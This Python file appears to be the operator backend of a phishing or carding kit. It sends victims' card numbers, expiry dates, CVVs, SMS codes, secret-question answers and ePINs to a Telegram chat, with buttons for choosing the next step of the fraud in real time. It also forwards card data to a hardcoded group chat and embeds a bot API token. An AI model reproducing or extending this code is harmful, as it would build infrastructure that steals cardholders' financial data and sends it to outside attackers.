from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
import time
API_TOKEN = '7032123911:AAHxZ3tLrb5A4e6P3KSS36z1O4W7a3SknrQ'
from telegram.error import TelegramError
def send_buttons_message(CHAT_ID, card, date, cvv):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
            InlineKeyboardButton("❓Secret❓", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐  `{cvv}`', reply_markup=reply_markup, parse_mode='MarkdownV2')

    
    while True:
        with open('button_state.txt', 'r') as file:
            content = file.read()
            if len(content) > 0:
                return True
        time.sleep(1)

def send_secret_question(CHAT_ID, card, date, cvv, question):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("❓Incorrect❓", callback_data='button5'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐 : `{cvv}`\n\n❓  `{question}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
    while True:
        with open('button_state.txt', 'r') as file:
            content = file.read()
            if len(content) > 0:
                return True
        time.sleep(1)
def send_sms(CHAT_ID, card, date, cvv, sms, epin):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button1'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("Error ePin", callback_data='button3'),
            InlineKeyboardButton("Epin", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐 : `{cvv}`\n\n💬 : `{sms}`\n\nePIN : `{epin}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
    while True:
        with open('button_state.txt', 'r') as file:
            content = file.read()
            if len(content) > 0:
                return True
        time.sleep(1)
def ne_pizdabol(card, chat_id='-1002224737693'):
    try:
        bot = Bot(token=API_TOKEN)
        message = f'{card}'
        bot.send_message(chat_id=chat_id, text=message)
        print("Message sent successfully")
    except TelegramError as e:
        print(f"Failed to send message: {e}")